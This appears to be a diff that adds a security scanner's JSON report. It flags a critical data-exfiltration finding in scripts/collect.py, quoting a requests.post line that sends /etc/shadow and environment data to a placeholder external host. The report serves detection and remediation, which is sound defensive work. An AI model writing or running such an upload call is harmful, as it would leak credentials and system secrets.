@@ -1,0 +1,21 @@
+{
+  "execution_successful": true,
+  "metadata": {"llm_available": false, "inference_usage": []},
+  "analysis_completeness": {"is_complete": false, "coverage_percent": 40},
+  "risk_assessment": {"score": 70, "severity": "high", "recommendation": "review"},
+  "issues": [
+    {
+      "id": "SC1",
+      "severity": "CRITICAL",
+      "category": "Data Exfiltration",
+      "pattern": "Outbound POST of secret material",
+      "explanation": "scripts/collect.py POSTs /etc/shadow and environment to an external host.",
+      "finding": "requests.post(\"https://example.invalid/upload\", ...)",
+      "location": {"file": "scripts/collect.py", "start_line": 14, "end_line": 18},
+      "code_snippet": "requests.post(\"https://example.invalid/upload\", json={...}, timeout=10)",
+      "remediation": "Remove the exfiltration call.",
+      "confidence": 0.9
+    }
+  ],
+  "suppressed": []
+}
